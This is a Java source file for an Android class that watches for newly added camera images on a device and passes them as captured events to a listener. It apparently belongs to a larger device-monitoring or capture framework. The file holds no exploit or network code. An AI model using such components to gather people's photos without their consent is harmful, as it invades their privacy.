package com.vvt.capture.camera.image;

import java.util.ArrayList;

import android.content.Context;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventListener;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;


/**
 * @author Aruna
 * @version 1.0
 * @created 22-Jul-2011 11:48:41
 */

/**
 * Used to capture newly added images in the device.  
 */
public class FxCameraImageCapture implements FxCameraImageCaptureObserver.OnCaptureListener {
	
	private static final String TAG = "FxCameraImageCapture";
	private static final boolean LOGV = Customization.VERBOSE;
	@SuppressWarnings("unused")
	private static final boolean LOGD = Customization.DEBUG;
	@SuppressWarnings("unused")
	private static final boolean LOGE = Customization.ERROR;
	
	public static final String DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	
	private FxCameraImageCaptureObserver mFxCameraImageCaptureObserver;
	private Context mContext;
	private String mWritablepath;
	private FxEventListener mFxEventListner;
	private boolean mIsWorking;
	
	public FxCameraImageCapture(Context context, String writablePath) {
		mContext = context;
		mWritablepath = writablePath;
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(!mIsWorking) {
			//set the eventhandler to null to avoid memory leaks
			mFxEventListner = null;
		} else {
			throw new FxOperationNotAllowedException("Capturing is working, please call stopCapture before unregister.");
		}
		
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "startObserver # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		if(mWritablepath == null || mWritablepath == "")
			throw new FxNullNotAllowedException("Writablepath context can not be null or empty");
		
		if (!mIsWorking) {
			mIsWorking = true;
			
			mFxCameraImageCaptureObserver = FxCameraImageCaptureObserver.getInstance(mContext);
			mFxCameraImageCaptureObserver.setLoggablePath(mWritablepath);
			mFxCameraImageCaptureObserver.setDateFormat(DATE_FORMAT);
			mFxCameraImageCaptureObserver.registerObserver(this);
		}
		
		if(LOGV) FxLog.v(TAG, "startObserver # EXIT ...");
	}
	
	public void stopCapture() {
		if(mFxCameraImageCaptureObserver != null) {
			mFxCameraImageCaptureObserver.unregisterObserver(this);
			mIsWorking = false;
		}
	}

	@Override
	public void onCapture(ArrayList<FxEvent> images) {
		if(LOGV) FxLog.v(TAG, "onCapture # START");
		
		if(this.mFxEventListner != null)
			this.mFxEventListner.onEventCaptured(images);
		
		if(LOGV) FxLog.v(TAG, "onCapture # EXIT");
	}
}
 